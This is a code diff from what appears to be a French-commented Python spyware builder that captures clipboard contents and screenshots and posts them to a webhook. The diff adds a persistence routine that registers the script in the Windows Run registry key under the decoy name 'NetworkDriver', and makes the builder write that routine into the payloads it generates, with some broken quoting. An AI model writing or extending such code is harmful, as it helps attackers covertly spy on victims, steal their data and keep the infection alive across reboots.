@@ -14,6 +14,7 @@ from PIL import ImageGrab
 import io
 import cx_Freeze
 import platform
+import winreg
 import getpass
 import socket
 
@@ -95,8 +96,30 @@ def clipboard_option_func():
             requests.post(webhook_url, json=message,files=files)
             old = mtn
 
-def autostart_option_func():
-    print("Option autostart activée")
+def autostart_option_func(script_path=None, name="NetworkDriver"):
+    # Chemin du script Python
+    if script_path is None:
+        script_path = os.path.abspath(__file__)
+
+    # Chemin vers python.exe utilisé pour lancer ton script
+    python_exe = sys.executable
+
+    # Commande complète à lancer au démarrage
+    command = f'"{python_exe}" "{script_path}"'
+
+    # On ouvre la clé Run dans le registre
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+
+    # On écrit la commande dans la clé
+    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
+    winreg.CloseKey(key)
+    
+
 
 
 
@@ -291,6 +314,24 @@ def pyw():
             f.write("files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
             f.write('message = "Screenshot envoyé"\n')
             f.write("requests.post(WEBHOOK, json=message,files=files)\n")
+
+
+        # Démarrage automatique
+        if config["options"]["autostart"]:
+            f.write("import sys, os, winreg\n\n")
+            f.write("def autostart_option_func(script_path=None, name='NetworkDriver''):\n")
+            f.write("   if script_path is None:\n")
+            f.write("       script_path = os.path.abspath(__file__)\n\n")
+            f.write("   python_exe = sys.executable\n\n")
+            f.write("   command = f''{python_exe}' '{script_path}''\n\n")
+            f.write("   key = winreg.OpenKey(\n")
+            f.write("       winreg.HKEY_CURRENT_USER,\n")
+            f.write("       r'Software\Microsoft\Windows\CurrentVersion\Run',\n")
+            f.write("       0,\n")
+            f.write("       winreg.KEY_SET_VALUE\n")
+            f.write("   )\n\n")
+            f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
+            f.write("    winreg.CloseKey(key)\n")
 
 
         # Alerte si infection
